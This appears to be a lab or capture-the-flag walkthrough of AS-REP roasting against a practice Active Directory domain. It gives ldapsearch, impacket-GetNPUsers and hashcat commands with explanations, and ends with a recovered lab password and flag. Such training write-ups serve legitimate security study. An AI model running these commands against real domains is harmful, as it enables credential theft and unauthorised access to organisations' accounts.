### Our first mission is:
1 - Enumerate all domain accounts and identify which ones have pre-authentication disabled

Blueprint:
`ldapsearch [1. Connection] [2. Authentication] [3. Search Anchor] [4. Target Filter] [5. Attributes]`

Command: 
```bash
ldapsearch -H ldap://192.168.56.20 -x -D "CN=student,CN=Users,DC=PENTESTLAB,DC=local" -w "password1234" -b "DC=PENTESTLAB,DC=local" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" samaccountname
```

Explanation: 

`-H ldap://IP_or_FDQN`: (or ldaps) specifies the target listening on network.

`-x`: is authentication type, where -x means use basic authentication with username and password.

`-D`: is Bind DN (Distinguished Name). This is the absolute path of the object. In this case, student object's path is specified. You can use "student@PENTESTLAB.local" as well. The difference is, second method is static, but first method is volatile. If 'student' user is moved to an OU, the structure will alter.

`-w`: Password handle. -w <password>

`-b`: is base DN. This basically means the base path you want to start searching from. For example, if you want to start searching from an OU, your base DN will look like "OU=IT,DC=PENTESTLAB,DC=local"

`"(userAccountControl:1.2.840.113556.1.4.803:=4194304)"`: 'Do Not Require Kerberos Pre-Authentication' is enabled filtering.

`samaccountname`: is saying that do not show every single info about a user, just their Logon ID's.

Brief Explanation:
"Open a basic, unencrypted network connection to the server at 192.168.56.20 over port 389. Log me in as the user named student, who lives inside the default Users folder of the PENTESTLAB.local domain, using the password password1234. Once authenticated, go to the absolute root database folder of the domain and scan every single object. Look inside each object's account settings integer (userAccountControl) and filter out only the accounts where the mathematical bit for 'Do Not Require Kerberos Pre-Authentication' is turned on. Finally, don't dump all their personal details; just show me their clean Windows logon IDs (samaccountname)."


### Our Second Mission is: Request their AS-REP hashes from the Domain Controller

This one is pretty straightforward.

```bash
impacket-GetNPUsers PENTESTLAB.local/student:'password1234' -dc-ip 192.168.56.20 -outputfile asrep_hashes.txt
```


### Third mission is: Crack the hash offline using a wordlist attack to recover the plaintext password

```bash
hashcat -a 0 -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

Explanation:

`-a 0` (Attack Mode): Specifies a straight Dictionary Attack. This tells Hashcat to read the wordlist line-by-line sequentially, without mixing words together or performing advanced brute-force variations.

`-m 18200` (Hash Type): This is the precise internal code for Kerberos 5 AS-REP ETYPE 23 (RC4-HMAC). If the Domain Controller used modern encryption for the ticket wrapper, you would change this flag to -m 18100 to target Kerberos 5 AS-REP ETYPE 18 (AES-256).

`asrep_hashes.txt` (Target File): Points to the output file created by your Impacket run containing the extracted $krb5asrep$ token strings.

`/usr/share/wordlists/rockyou.txt` (The Wordlist): The file path to your dictionary file. On Kali Linux, rockyou.txt is the standard pre-installed database containing over 14 million real-world passwords leaked in historical data breaches.

### Our Last mission is: Use the recovered credentials to authenticate and read a hidden LDAP attribute not visible through standard enumeration tools

┌──(kali㉿kali)-[~]
└─$ ldapsearch -H ldap://192.168.56.20 -x -D "CN=Legacy User,OU=IT-ServiceAccounts,OU=IT,OU=PENTESTLAB-CORP,DC=PENTESTLAB,DC=local" -w 'Password123' -b "DC=PENTESTLAB,DC=local" "(sAMAccountName=legacy)" comment  
\# extended LDIF
\#
\# LDAPv3
\# base <DC=PENTESTLAB,DC=local> with scope subtree
\# filter: (sAMAccountName=legacy)
\# requesting: comment 
\#

\# Legacy User, IT-ServiceAccounts, IT, PENTESTLAB-CORP, PENTESTLAB.local
dn: CN=Legacy User,OU=IT-ServiceAccounts,OU=IT,OU=PENTESTLAB-CORP,DC=PENTESTLAB,DC=local

`comment: FLAG_M2_T0{fe952761a0d5d62e32caa49d4a72e57e8765def3e720d3f5600fd7285d4a}`

\# search reference
ref: ldap://ForestDnsZones.PENTESTLAB.local/DC=ForestDnsZones,DC=PENTESTLAB,DC
 =local

